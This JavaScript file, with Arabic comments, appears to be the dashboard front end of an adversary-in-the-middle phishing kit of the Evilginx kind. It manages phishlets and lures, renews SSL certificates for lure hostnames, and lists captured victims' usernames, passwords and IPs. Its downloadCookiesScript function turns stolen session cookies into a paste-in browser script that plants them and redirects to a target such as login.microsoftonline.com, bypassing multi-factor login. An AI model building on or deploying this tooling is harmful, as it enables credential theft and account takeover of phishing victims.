            password !== 'Not logged in'
        );
        
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${sessionId}</td>
            <td>${phishlet}</td>
            <td>${username}</td>
            <td>${password}</td>
            <td>${ip}</td>
            <td>${formatDate(created)}</td>
            <td class="action-buttons">
                <button class="btn btn-sm btn-primary" data-action="view" data-id="${sessionId}">
                    <i class="fas fa-eye"></i> View
                </button>
                ${hasCredentials ? `<span class="badge badge-success">Logged in credentials</span>` : ''}
            </td>
        `;
        tbody.appendChild(tr);
    });
    
    // Add event listeners for view buttons
    const viewButtons = tbody.querySelectorAll('[data-action="view"]');
    viewButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const id = this.dataset.id;
            console.log('sessions:', id);
            // إضافة معرف الجلسة إلى زر التنزيل وإستدعاء دالة تنزيل الكوكيز مباشرة
            const downloadBtn = document.getElementById('download-cookies-btn');
            downloadBtn.dataset.sessionId = id;
            
            // تنزيل الكوكيز مباشرة بدلاً من عرض النافذة المنبثقة
            try {
                // الحصول على تفاصيل الجلسة أولاً للحصول على الكوكيز
        const sessionData = await fetchSessionDetails(id);
                console.log('Session data for cookies:', sessionData);
                
                // إضافة تحقق من وجود بيانات الجلسة
                if (!sessionData) {
                    showToast('Error', 'Session data not found', 'error');
                    return;
                }
                
                // التحقق من وجود cookie_tokens
                const cookieTokens = sessionData.cookie_tokens || sessionData.CookieTokens || sessionData.tokens || sessionData.Tokens || {};
                
                // إنشاء سكريبت الكوكيز
                downloadCookiesScript(sessionData);
    } catch (error) {
        console.error('Error fetching session details:', error);
        showToast('Error', 'Failed to load session details', 'error');
    }
        });
    });
}

// Show new Lure modal
async function showCreateLureModal() {
    // Fetch Phishlets list for display in dropdown
    const phishlets = await fetchPhishlets();
    
    console.log('Phishlets data at lure creation:', phishlets);
    
    // Create the popup window
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h3>Create New Lure</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <form id="create-lure-form">
                    <div class="form-group">
                        <label for="lure-phishlet">Phishlet</label>
                        <select id="lure-phishlet" class="form-control" required>
                            <option value="">-- Select Phishlet --</option>
                            ${phishlets.map(p => {
                                // Check activation status using all possible fields for the field
                                const isActive = p.is_active === true || p.isActive === true || p.IsActive === true || p.enabled === true;
                                return `<option value="${p.name}" ${isActive ? '' : 'disabled'}>${p.name} ${isActive ? '' : '(Disabled)'}</option>`;
                            }).join('')}
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="lure-hostname">Hostname</label>
                        <input type="text" id="lure-hostname" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label for="lure-path">Path (optional)</label>
                        <input type="text" id="lure-path" class="form-control" placeholder="/login">
                    </div>
                </form>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary modal-close-btn">Cancel</button>
                <button class="btn btn-primary" id="submit-lure">Create</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    
    // Add event listeners for closing
    const closeButtons = modal.querySelectorAll('.modal-close, .modal-close-btn');
    closeButtons.forEach(button => {
        button.addEventListener('click', function() {
            document.body.removeChild(modal);
        });
    });
    
    // Event handler for submitting the form
    const submitButton = modal.querySelector('#submit-lure');
    submitButton.addEventListener('click', async function() {
        const phishlet = modal.querySelector('#lure-phishlet').value;
        const hostname = modal.querySelector('#lure-hostname').value;
        const path = modal.querySelector('#lure-path').value;
        
        if (!phishlet || !hostname) {
            showToast('Error', 'Please fill in all required fields', 'error');
            return;
        }
        
        const lureData = {
            phishlet: phishlet,
            hostname: hostname,
            path: path || '/'
        };
        
        const result = await createLure(lureData);
        if (result) {
            document.body.removeChild(modal);
            
            // Update Lures table
            const updatedLures = await fetchLures();
            populateLuresTable(updatedLures);
            
            // Update statistics
            updateDashboard();
            
            // Update SSL certificates for new lure
            showToast('Information', 'Successfully created lure. Updating SSL certificates...', 'info');
            await updateCertificates();
        }
    });
}

// Format date
function formatDate(dateString) {
    if (!dateString) return 'Not available';
    
    try {
        // Attempt to create Date object
        const date = new Date(dateString);
        
        // Check date validity
        if (isNaN(date.getTime())) {
            return 'Invalid date';
        }
        
        // Format date correctly
        return date.toLocaleString('en-US', {
            year: 'numeric',
            month: 'numeric',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    } catch (error) {
        console.error('Error in date formatting:', error);
        return 'Invalid date';
    }
}

// ================= Event Handlers =================

// Toggle sidebar navigation
menuToggle.addEventListener('click', function() {
    sidebar.classList.toggle('collapsed');
    content.classList.toggle('expanded');
});

// Navigate between tabs
navLinks.forEach(link => {
    link.addEventListener('click', function(e) {
        e.preventDefault();
        
        // Remove active class from all links and tabs
        navLinks.forEach(function(l) {
            l.parentElement.classList.remove('active');
        });
        tabContents.forEach(function(tab) {
            tab.classList.remove('active');
        });
        
        // Add active class to clicked link and corresponding tab
        this.parentElement.classList.add('active');
        const targetId = this.getAttribute('data-target');
        document.getElementById(targetId).classList.add('active');
        
        // Load tab-specific data
        const tabName = targetId.replace('-tab', '');
        switch(tabName) {
            case 'phishlets':
                fetchPhishlets().then(populatePhishletsTable);
                break;
            case 'lures':
                fetchLures().then(populateLuresTable);
                break;
            case 'sessions':
                fetchSessions().then(populateSessionsTable);
                break;
            case 'dashboard':
                updateDashboard();
                break;
        }
    });
});

// Update data buttons
phishletsRefreshBtn.addEventListener('click', function() {
    fetchPhishlets().then(data => {
        populatePhishletsTable(data);
        showToast('Success', 'Successfully updated Phishlets', 'success');
    });
});

luresRefreshBtn.addEventListener('click', function() {
    fetchLures().then(data => {
        populateLuresTable(data);
        showToast('Success', 'Successfully updated Lures', 'success');
    });
});

sessionsRefreshBtn.addEventListener('click', function() {
    fetchSessions().then(data => {
        populateSessionsTable(data);
        showToast('Success', 'Successfully updated Sessions', 'success');
    });
});

// SSL certificates update button
if (updateCertificatesBtn) {
    updateCertificatesBtn.addEventListener('click', function() {
        updateCertificates();
    });
}

// Create new Lure button
createLureBtn.addEventListener('click', showCreateLureModal);

// Logout button
logoutBtn.addEventListener('click', function() {
    // Remove token from local storage
    localStorage.removeItem('authToken');
    // Redirect user to login page
    window.location.href = '/login.html';
});

// Perform SSL certificates update request
async function updateCertificates() {
    try {
        showToast('Processing', 'Updating SSL certificates...', 'info');
        
        const response = await fetch(`${API_BASE_URL}/config/certificates`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw new Error(`Failed to update SSL certificates: ${response.statusText}`);
        }
        
        const data = await response.json();
        console.log('SSL certificates update response:', data);
        
        if (data.success) {
            showToast('Success', data.message || 'Successfully updated SSL certificates', 'success');
            return true;
        } else {
            showToast('Error', data.message || 'Failed to update SSL certificates', 'error');
            return false;
        }
    } catch (error) {
        console.error('Error in updating SSL certificates:', error);
        showToast('Error', `An error occurred: ${error.message}`, 'error');
        return false;
    }
}

// ================= Initialization =================

// Initialize Application
document.addEventListener('DOMContentLoaded', async function() {
    console.log('تم تحميل صفحة لوحة التحكم، التحقق من المصادقة...');
    
    try {
        // تنفيذ التحقق من المصادقة قبل أي شيء آخر
        await checkAuthentication();
        console.log('تم التحقق من المصادقة بنجاح، جاري تحميل البيانات...');
        
        // جلب بيانات اللوحة
        try {
            await updateDashboard();
            // تهيئة الخريطة بعد تحميل البيانات
            initMap();
            console.log('تم تحميل بيانات اللوحة بنجاح');
        } catch (dataError) {
            console.error('خطأ في تحميل بيانات اللوحة:', dataError);
            // إظهار رسالة خطأ للمستخدم مع السماح بالبقاء على الصفحة
            document.getElementById('content').innerHTML = `
                <div class="alert alert-danger">
                    <h4>فشل في تحميل البيانات</h4>
                    <p>${dataError.message}</p>
                    <button class="btn btn-primary mt-3" onclick="location.reload()">إعادة المحاولة</button>
                </div>
            `;
        }
    } catch (authError) {
        console.error('خطأ في المصادقة أثناء بدء التشغيل:', authError);
        // سيتم التعامل مع الخطأ في دالة checkAuthentication
    }
    
    // إضافة مستمع لتغيير الصفحة في التاريخ
    window.addEventListener('popstate', function() {
        if (window.location.hash !== lastUrl) {
            lastUrl = window.location.hash;
            checkAuthentication();
        }
    });
});

// Initialize typewriter effect
function initTypewriterEffect() {
    const typewriterElements = document.querySelectorAll('.typewriter');
    
    typewriterElements.forEach(element => {
        const text = element.getAttribute('data-text');
        if (!text) return;
        
        // Reset element content
        element.textContent = '';
        
        // Add characters one by one
        let charIndex = 0;
        const typeInterval = setInterval(() => {
            if (charIndex < text.length) {
                element.textContent += text.charAt(charIndex);
                charIndex++;
            } else {
                clearInterval(typeInterval);
                
                // Wait and then remove characters to restart effect
                setTimeout(() => {
                    const eraseInterval = setInterval(() => {
                        if (element.textContent.length > 0) {
                            element.textContent = element.textContent.slice(0, -1);
                        } else {
                            clearInterval(eraseInterval);
                            
                            // Wait and restart
                            setTimeout(() => {
                                initTypewriterEffect();
                            }, 1000);
                        }
                    }, 75);
                }, 3000);
            }
        }, 100);
    });
}

// Setup event listeners
function setupEventListeners() {
    // Sidebar toggle
    menuToggle.addEventListener('click', function() {
        sidebar.classList.toggle('collapsed');
        content.classList.toggle('expanded');
    });

    // Tab navigation
    navLinks.forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Remove active class from all links and tabs
            navLinks.forEach(function(l) {
                l.parentElement.classList.remove('active');
            });
            tabContents.forEach(function(tab) {
                tab.classList.remove('active');
            });
            
            // Add active class to clicked link and corresponding tab
            this.parentElement.classList.add('active');
            const targetId = this.getAttribute('data-target');
            document.getElementById(targetId).classList.add('active');
            
            // Load tab-specific data
            const tabName = targetId.replace('-tab', '');
            switch(tabName) {
                case 'phishlets':
                fetchPhishlets().then(populatePhishletsTable);
                    break;
                case 'lures':
                fetchLures().then(populateLuresTable);
                    break;
                case 'sessions':
                    fetchSessions().then(populateSessionsTable);
                    break;
                case 'dashboard':
                    updateDashboard();
                    break;
            }
        });
    });

    // Button event listeners
    const refreshDashboardBtn = document.getElementById('refresh-dashboard');
    if (refreshDashboardBtn) {
        refreshDashboardBtn.addEventListener('click', updateDashboard);
    }
    
    const exportStatsBtn = document.getElementById('export-stats');
    if (exportStatsBtn) {
        exportStatsBtn.addEventListener('click', exportStatistics);
    }
    
    if (phishletsRefreshBtn) {
        phishletsRefreshBtn.addEventListener('click', function() {
            fetchPhishlets().then(populatePhishletsTable);
        });
    }
    
    if (luresRefreshBtn) {
        luresRefreshBtn.addEventListener('click', function() {
            fetchLures().then(populateLuresTable);
        });
    }
    
    if (createLureBtn) {
        createLureBtn.addEventListener('click', showCreateLureModal);
    }
    
    if (updateCertificatesBtn) {
        updateCertificatesBtn.addEventListener('click', updateCertificates);
    }
    
    // Logout button
    if (logoutBtn) {
        logoutBtn.addEventListener('click', function() {
            localStorage.removeItem('authToken');
            window.location.href = '/login.html';
        });
    }
}

// Add download cookies script
function downloadCookiesScript(sessionData) {
    const downloadBtn = document.getElementById('download-cookies-btn');
    const sessionId = downloadBtn.dataset.sessionId;
    
    if (!sessionId) {
        showToast('Error', 'Session ID not found', 'error');
        return;
    }
    
    // إنشاء صفيف للكوكيز
    const cookies = [];
    
    // التحقق من وجود بيانات الجلسة وتوكنز الكوكيز فيها
    if (sessionData) {
        // التحقق من مصادر محتملة مختلفة للكوكيز في بيانات الجلسة
        const cookieTokens = sessionData.cookie_tokens || sessionData.CookieTokens || sessionData.tokens || sessionData.Tokens || {};
        
        // إذا وجدت توكنز كوكيز، قم بإضافتها
        if (cookieTokens && Object.keys(cookieTokens).length > 0) {
            for (const domain in cookieTokens) {
                const domainCookies = cookieTokens[domain];
                
                for (const cookieName in domainCookies) {
                    const cookie = domainCookies[cookieName];
                    
                    // التحقق من نوع البيانات وتنسيقها بشكل صحيح
                    let cookieValue = '';
                    if (typeof cookie === 'string') {
                        cookieValue = cookie;
                    } else if (cookie && typeof cookie === 'object') {
                        cookieValue = cookie.value || cookie.Value || JSON.stringify(cookie);
                    }
                    
                    cookies.push({
                        name: cookieName,
                        value: cookieValue,
                        domain: domain,
                        expirationDate: Date.now() + 31536000000, // سنة واحدة من الآن
                        hostOnly: false,
                        httpOnly: true,
                        path: "/",
                        sameSite: "none",
                        secure: true,
                        session: true,
                        storeId: null
                    });
                }
            }
        }
        
        // إذا لم يتم العثور على أي كوكيز من البيانات، عرض رسالة
    const cookiesTable = document.getElementById('cookies-table');
            if (cookiesTable) {
                const rows = cookiesTable.querySelectorAll('tbody tr');
                
                rows.forEach(row => {
                    // تجاوز الصفوف التي تحتوي على رسائل (مثل "No cookies available")
                    if (row.cells.length === 1) return;
                    
                    cookies.push({
                        name: row.cells[1].textContent,
                        value: row.cells[2].textContent,
                        domain: row.cells[0].textContent,
                        expirationDate: Date.now() + 31536000000, // سنة واحدة من الآن
                        hostOnly: false,
                        httpOnly: true,
                        path: "/",
                        sameSite: "none",
                        secure: true,
                        session: true,
                        storeId: null
                    });
                });
            }
        } else {
        // استخدام الطريقة القديمة للحصول على الكوكيز من الجدول إذا لم تتوفر بيانات الجلسة
        const cookiesTable = document.getElementById('cookies-table');
        if (cookiesTable) {
    const rows = cookiesTable.querySelectorAll('tbody tr');
    
    // التحقق من وجود كوكيز
    if (rows.length === 0 || (rows.length === 1 && rows[0].cells.length === 1)) {
                showToast('Error', 'No cookies found for this session', 'error');
        return;
    }
    
    rows.forEach(row => {
        // تجاوز الصفوف التي تحتوي على رسائل (مثل "No cookies available")
        if (row.cells.length === 1) return;
        
        cookies.push({
            name: row.cells[1].textContent,
                    value: row.cells[2].textContent,
                    domain: row.cells[0].textContent,
                    expirationDate: Date.now() + 31536000000, // سنة واحدة من الآن
                    hostOnly: false,
                    httpOnly: true,
                    path: "/",
                    sameSite: "none",
                    secure: true,
                    session: true,
                    storeId: null
        });
    });
        }
    }
    
    // التحقق النهائي من وجود كوكيز
    if (cookies.length === 0) {
        showToast('Error', 'No cookies found for this session', 'error');
        return;
    }
    
    // Print cookies in browser console
    console.log('%c🍪 Session Cookies ' + sessionId, 'font-size:14px; font-weight:bold; color:#3498db;');
    console.log('%c=================================', 'color:#3498db;');
    
    cookies.forEach((cookie, index) => {
        console.log(
            `%c[${index+1}] ${cookie.name}%c\nDomain: ${cookie.domain}\nValue: ${cookie.value}`, 
            'font-weight:bold; color:#2ecc71;', 
            'color:#95a5a6;'
        );
    });
    
    console.log('%c=================================', 'color:#3498db;');
    console.log('%cTotal Cookies: ' + cookies.length, 'font-weight:bold;');
    
    // الحصول على النطاق المستهدف للانتقال بعد تعيين الكوكيز
    const targetDomain = cookies.length > 0 && cookies[0].domain ? cookies[0].domain : "login.microsoftonline.com";
    
    // إنشاء نص JavaScript بالتنسيق المطلوب
    let jsCode = `!function(){let e=JSON.parse(\`${JSON.stringify(cookies)}\`);for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}${`\${o.domain?\`\${o.path?"":"path=/"};domain=\${o.domain};\`:""}`}Secure;SameSite=None\`;window.location.href="https://${targetDomain}"}();`;
    
    // إنشاء ملف نصي
    const blob = new Blob([jsCode], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    
    // إنشاء رابط تنزيل
    const downloadLink = document.createElement('a');
    downloadLink.href = url;
    downloadLink.download = `cookies_${sessionId}_${Date.now()}.txt`;
    
    // تنزيل الملف
    document.body.appendChild(downloadLink);
    downloadLink.click();
    document.body.removeChild(downloadLink);
    
    // إظهار رسالة نجاح
    showToast('Success', 'Cookies script created successfully and printed in browser console', 'success');
}

// Export statistics to CSV
function exportStatistics() {
    try {
        // Get current stats data
        const stats = {
            total: {
                visits: parseInt(visitsCountElement.textContent) || 0,
                success: parseInt(successLoginsCountElement.textContent) || 0,
                failed: parseInt(failedLoginsCountElement.textContent) || 0,
                office: parseInt(officeLoginsCountElement.textContent) || 0
            },
            today: {
                visits: parseInt(todayVisits.textContent) || 0,
                success: parseInt(todaySuccess.textContent) || 0,
                failed: parseInt(todayFailed.textContent) || 0
            },
            week: {
                visits: parseInt(weekVisits.textContent) || 0,
                success: parseInt(weekSuccess.textContent) || 0,
                failed: parseInt(weekFailed.textContent) || 0
            },
            month: {
                visits: parseInt(monthVisits.textContent) || 0,
                success: parseInt(monthSuccess.textContent) || 0,
                failed: parseInt(monthFailed.textContent) || 0
            }
        };
        
        // Create CSV content
        let csvContent = "data:text/csv;charset=utf-8,";
        
        // Add headers
        csvContent += "Category,Metric,Value\n";
        
        // Add total stats
        csvContent += "Total,Visits," + stats.total.visits + "\n";
        csvContent += "Total,Successful Logins," + stats.total.success + "\n";
        csvContent += "Total,Failed Logins," + stats.total.failed + "\n";
        csvContent += "Total,Office Logins," + stats.total.office + "\n";
        
        // Add today stats
        csvContent += "Today,Visits," + stats.today.visits + "\n";
        csvContent += "Today,Successful Logins," + stats.today.success + "\n";
        csvContent += "Today,Failed Logins," + stats.today.failed + "\n";
        
        // Add week stats
        csvContent += "This Week,Visits," + stats.week.visits + "\n";
        csvContent += "This Week,Successful Logins," + stats.week.success + "\n";
        csvContent += "This Week,Failed Logins," + stats.week.failed + "\n";
        
        // Add month stats
        csvContent += "This Month,Visits," + stats.month.visits + "\n";
        csvContent += "This Month,Successful Logins," + stats.month.success + "\n";
        csvContent += "This Month,Failed Logins," + stats.month.failed + "\n";
        
        // Create download link
        const encodedUri = encodeURI(csvContent);
        const link = document.createElement("a");
        link.setAttribute("href", encodedUri);
        
        // Get current date for filename
        const now = new Date();
        const dateStr = now.getFullYear() + '-' + 
                       String(now.getMonth() + 1).padStart(2, '0') + '-' + 
                       String(now.getDate()).padStart(2, '0');
        
        link.setAttribute("download", "phishing-stats-" + dateStr + ".csv");
        document.body.appendChild(link);
        
        // Click the link to trigger download
        link.click();
        
        // Clean up
        document.body.removeChild(link);
        
        showToast('Success', 'Statistics exported successfully', 'success');
    } catch (error) {
        console.error('Error exporting statistics:', error);
        showToast('Error', 'Failed to export statistics', 'error');
    }
}

// Initialize world map
function initWorldMap() {
    // التحقق مما إذا كان عنصر الخريطة موجودًا
    const mapElement = document.getElementById('world-map');
    if (!mapElement) {
        console.error('World map element not found!');
        return;
    }
    
    // في البداية، سنستخدم بيانات إفتراضية للدول
    // يمكن تحديث هذه البيانات لاحقًا استنادًا إلى البيانات الفعلية
    const defaultCountries = {
        US: 15,  // United States
        CA: 8,   // Canada
        GB: 6,   // United Kingdom
        FR: 4,   // France
        DE: 5,   // Germany
        AU: 7,   // Australia
        IN: 10,  // India
        CN: 12,  // China
        RU: 9,   // Russia
        BR: 3,   // Brazil
        AE: 2,   // UAE
        SA: 4,   // Saudi Arabia
        EG: 1    // Egypt
    };

    try {
        // استخدام jQuery بشكل صريح مع النسخة القديمة من jVectorMap
        $(mapElement).vectorMap({
            map: 'world_mill_en',
            backgroundColor: 'transparent',
            zoomOnScroll: true,
            regionStyle: {
                initial: {
                    fill: '#2e3749', // لون الدول الافتراضي
                    'fill-opacity': 1,
                    stroke: '#1a1f2b', // لون الحدود
                    'stroke-width': 0.5,
                    'stroke-opacity': 0.5
                },
                hover: {
                    fill: '#3f4a5f', // لون التحويم
                    'fill-opacity': 0.8,
                    cursor: 'pointer'
                },
                selected: {
                    fill: '#800000' // لون الاختيار
                },
                selectedHover: {
                    fill: '#a52a2a' // لون التحويم عند الاختيار
                }
            },
            series: {
                regions: [{
                    values: defaultCountries,
                    scale: ['#ffd6cc', '#800000'], // مقياس الألوان من الفاتح إلى الداكن
                    normalizeFunction: 'polynomial'
                }]
            },
            onRegionLabelShow: function(e, el, code) {
                const visitors = defaultCountries[code] || 0;
                el.html(el.html() + ': ' + visitors + ' visitors');
            }
        });
        
        // الحصول على مرجع للخريطة للاستخدام لاحقًا (يختلف عن النسخة الجديدة)
        worldMap = $(mapElement).vectorMap('get', 'mapObject');
        
        console.log('World map initialized successfully');
    } catch (error) {
        console.error('Error initializing world map:', error);
    }
}

// Update map with new data
function updateWorldMap(data) {
    if (!worldMap) {
        console.warn('World map not initialized');
        return;
    }
    
    try {
        // تحديث بيانات الخريطة في jVectorMap 1.2.2
        worldMap.series.regions[0].setValues(data);
        console.log('World map updated with new data:', data);
    } catch (error) {
        console.error('Error updating world map:', error);
    }
}

// Extract country data from sessions
function extractCountryData(sessions) {
    const countryCount = {};
    
    // يمكن هنا استخدام معلومات IP للضحايا لتحديد الدول
    // كمثال، سنقوم بتعيين بعض البيانات العشوائية
    const demoCountries = ['US', 'CA', 'GB', 'FR', 'DE', 'AU', 'IN', 'CN', 'RU', 'BR', 'AE', 'SA', 'EG'];
    
    sessions.forEach(session => {
        // في النظام الفعلي، هنا يمكن استخدام API لتحديد الدولة من عنوان IP
        // كمثال، سنختار دولة عشوائية لكل جلسة
        const randomCountry = demoCountries[Math.floor(Math.random() * demoCountries.length)];
        
        if (!countryCount[randomCountry]) {
            countryCount[randomCountry] = 1;
        } else {
            countryCount[randomCountry]++;
        }
    });
    
    return countryCount;
}

// مسح بيانات الجلسة
function clearSessionData() {
    localStorage.removeItem('authToken');
    localStorage.removeItem('userToken');
    deleteCookie('Authorization');
}

// دالة مساعدة لحذف كوكي
function deleteCookie(name) {
    document.cookie = name + '=; Max-Age=-99999999; path=/';
} 